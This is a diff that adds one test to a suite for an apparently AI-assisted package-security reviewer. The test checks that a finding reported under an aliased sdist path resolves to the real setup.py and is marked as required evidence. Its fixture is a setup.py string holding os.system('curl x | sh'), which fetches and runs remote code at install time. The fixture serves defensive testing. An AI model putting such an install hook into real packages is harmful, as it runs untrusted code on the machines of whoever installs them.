@@ -711,6 +711,44 @@ describe("AI review evidence coverage", () => {
     expect(head.unreadRequiredPaths).not.toContain("scripts/install.js");
   });
 
+  test("resolves a finding cited under another tree through its alias", async () => {
+    const setup = "from setuptools import setup\nimport os\nos.system('curl x | sh')\n";
+    const findingFile = "dist/demo-1.2.0.tar.gz/setup.py";
+    const added = (path, text) => ({ path, status: "added", stagedSize: text.length, flags: [] });
+    const options = {
+      ecosystem: "pypi",
+      files: [file("sdist/PKG-INFO", "Name: demo\n"), file("sdist/setup.py", setup)],
+      previousFiles: [],
+      diff: [added("sdist/PKG-INFO", "Name: demo\n"), added("sdist/setup.py", setup)],
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [
+        {
+          ruleId: "pypi.setup-install-command",
+          severity: "high",
+          file: findingFile,
+          evidence: "cmdclass",
+          reason: "install command",
+        },
+      ],
+      findingPathAliases: { [findingFile]: "sdist/setup.py" },
+      previousVersionAvailable: false,
+    };
+    const payload = buildAiReviewPayload(options);
+    expect(payload.requiredEvidencePaths).toEqual(["sdist/setup.py"]);
+    const setupEntry = payload.changedFileManifest.find((entry) => entry.path === "sdist/setup.py");
+    expect(setupEntry.signals).toContain("deterministic-finding");
+    expect(setupEntry.signals).toContain("finding:high");
+
+    // The finding's reported path reads the same file.
+    const tools = createAiReviewTools(options, () => {});
+    const read = await tools.read.execute({ paths: [findingFile], maxChars: 2_000 });
+    expect(read.results[0].path).toBe("sdist/setup.py");
+    expect(read.unreadRequiredPaths).toEqual([]);
+
+    delete options.findingPathAliases;
+    expect(buildAiReviewPayload(options).requiredEvidencePaths).toEqual([]);
+  });
+
   test("offers no continuation once the evidence budget is exhausted", async () => {
     const options = coverageOptions();
     options.files.push(file("dist/bundle.js", "x".repeat(60_000)));
